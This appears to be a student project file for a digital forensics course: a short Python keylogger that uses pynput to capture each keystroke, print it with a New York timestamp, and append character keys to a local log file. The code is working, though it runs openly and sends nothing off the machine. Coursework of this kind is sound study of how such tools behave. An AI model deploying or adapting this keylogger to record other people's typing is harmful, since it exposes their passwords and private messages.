# Keylogger project [DEMO ONLY]
# CSCI 411: Digital Forensics 
# Daniel, David, Mufassir, Dinka, Shirdik
'''
TO DO:
- Apply Timezone for timestamp/timezone navigation. [DONE]
- Apply exact zone information.(New York) [DONE]
- Apply Keystrokes, along with it being connected to the timestamp. [DONE]
- Apply  and create an example file to connect and monitor.(Optional) [DONE]
- Apply keylog pressed that connects to the keyboard and listener to retrieve exact keystrokes. [DONE]
- Apply connection to VM. [N/A]
- Apply output to show exact lineing. [DONE]
'''
from pynput import keyboard
from datetime import datetime
from zoneinfo import ZoneInfo 
TIMEZONE = ZoneInfo("America/New_York")

def keyPressed(key):
    timestamp = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S %Z") #strftime?
    #print(str(key))
    print(f"{timestamp} - {str(key)}")
    with open("KeyFile.txt", 'a') as logKey:
        try:
            char = key.char
            #logKey.write(char)
            logKey.write(f"{timestamp} - {char}\n")
        except:
            print("----------") # To end per key that's being pressend (Non char)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()